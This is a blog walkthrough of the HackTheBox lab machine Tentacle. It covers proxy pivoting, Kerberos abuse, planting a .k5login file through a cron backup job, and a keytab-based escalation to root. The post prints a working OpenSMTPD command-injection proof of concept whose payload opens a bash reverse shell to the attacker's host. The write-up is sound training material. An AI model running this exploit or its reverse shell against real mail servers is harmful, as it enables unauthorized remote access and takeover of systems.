---
layout: walkthrough
title: HackTheBox - Tentacle
date: 2021-06-20 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/tentacle.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Tentacle --`10.10.10.224`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 06:10 EDT

vagrant@ko:~/Desktop/HackTheBox/Tentacle$ nmap -sC -sV 10.10.10.224
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 06:10 EDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 0.48 seconds
vagrant@ko:~/Desktop/HackTheBox/Tentacle$ nmap -sC -sV 10.10.10.224 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 06:10 EDT
Nmap scan report for 10.10.10.224
Host is up (0.18s latency).
Not shown: 995 filtered ports
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-04-23 10:22:09Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
9090/tcp closed zeus-admin
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.67 seconds

```

</details>

As shown above, this was a Linux RedHat machine and it had a few ports open, however none of them seemed to be hosting web applications that I could access. Additionally, the closed `Zeus-Admin` port provided a potential domain name: **REALCORP.HTB**. 

### Squid Proxy
I didn't have anything to go off of at this point, so I started browsing to `realcorp.htb:3128`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img1.png"  style="width: 80%" />
</p>

The webpage didn't contain a lot of useful information, however it did include:
- Cache Administrator: j.nakazawa@realcorp.htb
- Potential Subdomain: srv01.realcorp.htb

### DNS Enumeration
Since the host was hosting a DNS service, I attempted to brute force additional information through the use of `dnsenum`:

```bash
dnsenum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb
```

The command produced the following useful information:

```bash

Name Servers:
______________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77

Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:
________________________________________________________________________________________

ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31

```

As shown above, I now had access to several new subdomains and IP addresses. I knew that the server had a Squid Proxy running so I attempted to make use of ProxyChains to perform additional enumeration. I edited the `/etc/proxychains.conf` file and included the host entries to the end:

```bash
[ProxyList]
http    10.10.10.224 3128
http    127.0.0.1 3128
http    10.197.243.77 3128
http    10.197.243.31 3128
```

Once the new items were included, I started nmap through the proxy configuration, starting with the `wpad` entry:

```bash
proxychains nmap -sT -Pn 10.197.243.31 -oN WPAD_Proxy.nmap
```

There was a lot of output so I've only included the open ports below:

<details>

```bash
Nmap scan report for wpad.realcorp.htb (10.197.243.31)
Host is up (0.92s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 942.01 seconds

```

</details>

Now that I knew that I had access to the internal hosts, I decided to try and access some of the ports through the proxy. I started with the web application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img2.png"  style="width: 80%" />
</p>

Unfortunately, I still didn't have access to application, but I did attempt to access the default wpad configuration file -- `wpad.dat`  -- which allowed me to download the configuration:

```python
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}

```

From the configuration file above, I was able to extract 2 additional IP addresses: `10.197.243.0` and `10.241.251.0`. Since I already knew about the `10.197.243.0/24` octet, I started by scanning the `10.241.251.0` octet to determine if there were any additional IP addresses available.

After several minutes, the nmap completed and it showed only 2 open hosts, including `10.241.251.113`. From there, I performed a full nmap on that host which resulted in the following output:

```bash
Nmap scan report for 10.241.251.113
Host is up (0.90s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds

```

As shown above, the host had SMTP open running OpenSMTPD and I added `smtp.realcorp.htb` to `/etc/hosts`.

### Exploiting OpenSMTPD

> OpenSMTPD is the mail transfer agent (e-mail server) of the OpenBSD operating system and is also available as a ‘portable’ version for other UNIX systems, such as GNU/Linux.

I started looking into potential exploits and I came across the following blog post: <https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/>.  I copied to PoC and I modified the exploit to return a reverse shell instead of writing the information to disk. I modified the exploit as follows:
- Changed recipient to: `j.nakazawa@realcorp.htb`.
- Changed command to accept a reverse shell.

The PoC is provided below:

<details>

```python
import socket, time
import sys
if len(sys.argv) < 2:
    print("usage: smtp_exploit.py <host>")
    exit()
HOST = sys.argv[1]
PORT = 25
rev_shell_cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.135/9001 0>&1"'
payload = b"""\r\n

#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n 
#c\r\n
#d\r\n
""" + rev_shell_cmd.encode() + b"""
.
"""
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print('could not open socket')
    sys.exit(1)
with s:
    data = s.recv(1024)
    print('Received', repr(data))
    time.sleep(1)
    print('SENDING HELO')
    s.send(b"helo test.com\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
    time.sleep(1)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"DATA\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(payload)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"QUIT\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
print("done")
s.close()
```

</details>

With the exploit successfully modified, I ran the exploit on my machine through ProxyChains:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img3.png"  style="width: 80%" />
</p>

As shown below, the exploit was successful and I managed to obtain a shell on the host:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img4.png"  style="width: 80%" />
</p>

## Lateral Movement as Root on SMTP
Success! With access to the host, I started performing some basic enumeration. I looked for the users that had access to the host and the `j.nakazawa` user had a home folder. I started poking around the folder and came across a strange file extension: `.msmtprc`.

> msmtp is an SMTP client that can be used to send mails from MUAs (mail user agents) like Mutt or Emacs. It forwards mails to an SMTP server (for example at a free mail provider), which takes care of the final delivery. Using profiles, it can be easily configured to use different SMTP servers with different configurations, which makes it ideal for mobile clients.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img5.png"  style="width: 80%" />
</p>

The file contained credentials for the `j.nakazawa` user. I attempted to use the credentials to SSH into the host, however I was not able to. Since these were the only credentials that I had access to, and I had no other leads, I looked back on what was available at this point and remembered that Kerberos (port 88) was open. 

### Authentication via Kerberos

> Kerberos provides a mechanism that allows both users and machines to identify themselves to network and receive defined, limited access to the areas and services that the administrator configured. Kerberos _authenticates_ entities by verifying their identity, and Kerberos also secures this authenticating data so that it cannot be accessed and used or tampered with by an outsider.

If you would like to learn more about the protocol, RedHat has a nice breakdown: <https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/using_kerberos>. I started looking into Kerberos authentication and came across an Ubuntu blog post which described the method to set up server and client authentication: <https://ubuntu.com/server/docs/service-kerberos>.

To install the packages I entered the following in a terminal prompt:

```bash
sudo apt install krb5-user sssd-krb5
```

Once krb5 was installed, I modified the `/etc/krb5.conf` file to include the following:
- default_realm = REALCORP.HTB
- REALCORP.HTB = {kdc = 10.10.10.224}

With the KDC initialized, I used the `kinit` command for the user:

```bash
kinit j.nakazawa
```

As a last step, I needed to confirm that the Kerberos ticket was created with the `klist` command.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img6.png"  style="width: 80%" />
</p>

After confirming that the ticket existed, I used SSH once again and I was able to authenticate to the host using Kerberos authentication.

## Lateral Movement using j.nakazawa
Now that I had access to the new host, I started by performing some additional enumeration:

<details>

```bash

srv01.realcorp.htb
 
id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
ifconfig:
cni-podman1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.241.251.1  netmask 255.255.255.0  broadcast 10.241.251.255
        inet6 fe80::94a1:45ff:fe94:da4f  prefixlen 64  scopeid 0x20<link>
        ether 96:a1:45:94:da:4f  txqueuelen 1000  (Ethernet)
        RX packets 212  bytes 17929 (17.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 251  bytes 19481 (19.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.224  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::6588:7412:db10:612c  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:d0:20  txqueuelen 1000  (Ethernet)
        RX packets 20205  bytes 2457855 (2.3 MiB)
        RX errors 0  dropped 629  overruns 0  frame 0
        TX packets 1740  bytes 155763 (152.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192:0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.197.243.77  netmask 255.255.255.0  broadcast 10.197.243.255
        ether 00:50:56:b9:d0:20  txqueuelen 1000  (Ethernet)

ens192:1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.197.243.31  netmask 255.255.255.0  broadcast 10.197.243.255
        ether 00:50:56:b9:d0:20  txqueuelen 1000  (Ethernet)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1561  bytes 122054 (119.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1561  bytes 122054 (119.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth48744099: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::b1:89ff:fe86:69d5  prefixlen 64  scopeid 0x20<link>
        ether 02:b1:89:86:69:d5  txqueuelen 0  (Ethernet)
        RX packets 212  bytes 20897 (20.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 254  bytes 19747 (19.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 
groups:
j.nakazawa squid users
```

</details>

It seemed as if the user was part of a few different groups, but I also ran `linpeas.sh` to perform additional enumeration on the host. Looking through the output, I came across a crontab which specified a backup file:

<details>

```bash
/etc/cron.weekly:
total 12
drwxr-xr-x.  2 root root    6 May 11  2019 .
drwxr-xr-x. 95 root root 8192 May  6 05:14 ..
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root


* * * * * admin /usr/local/bin/log_backup.sh
```

</details>

Additionally, I found a hash within the `/etc/squid/passwd` file which I set to crack in the background but this never came to fruition. While the hash was being cracked, I looked into the `log_backup.sh` file:

```bash
[j.nakazawa@srv01 tmp]$ cat /usr/local/bin/log_backup.sh
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log

```

As shown above, the file performs the following actions:
- Syncs the `/var/log/squid` folder to `/home/admin`
- Creates a tarball using the access and cache logs. 

### Log Poisoning
I needed to add a file within the squid directory which would then be added to the tarball. Since I was part of the `squid` group, I was able to write a file to the directory. 

In order to exploit this, I created a kerberos login file (`.k5login`) and added the credentials for the user that I already had Kerberos authentication enabled for -- `j.nakazawa`. Another method would have been to create an authorized_keys file within the admin user's SSH directory. I used the following commands:

```bash
cd /tmp
echo "j.nakazawa@REALCORP.HTB" > .k5login
cp .k5login /var/log/squid
```

After a few minutes, I was able to authenticate to the host as the `admin` user via SSH:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img8.png"  style="width: 80%" />
</p>

## Privilege Escalation using Admin
After authenticating to the host as the admin user, I started by performing additional enumeration using linpeas. Linpeas didn't return anything useful this time, additionally the user didn't seem to have too many directories that they had access to. I decided to view all files that the `admin` user had access to:

```bash
find / -user admin -group admin -ls
```

The admin user had a ton of files that they could read, including the `keytab` file.

### Keytab Files
> A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your Kerberos password, you will need to recreate all your keytabs.

> Keytab files are commonly used to allow scripts to automatically authenticate using Kerberos, without requiring human interaction or access to password stored in a plain-text file. The script is then able to use the acquired credentials to access files stored on a remote system.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img9.png"  style="width: 80%" />
</p>

Based on this information, I used the `klist` command to determine the contents of the keytab file:

<details>

```bash
[admin@srv01 ~]$ klist -k /etc/krb5.keytab
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
```

</details>

Since I was the admin user, I was able to log on as the Kerberos administrator and created a principal in the KDC. More information on this process can be found [here](https://www.ibm.com/docs/en/spectrum-symphony/7.1.2?topic=file-creating-kerberos-principal-keytab).

Since I wanted to escalate to root, I decided to add the root user to the keytab. To authenticate, I used the following command:

```bash
kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

From there, I added the following principal to include the root user in the keytab file for Kerberos authentication:

```bash
add_principal root@REALCORP.HTB
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img10.png"  style="width: 80%" />
</p>

Finally, to authenticate as the root user, I used the  Kerberos Switch  Users (ksu) command:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tentacle/img11.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
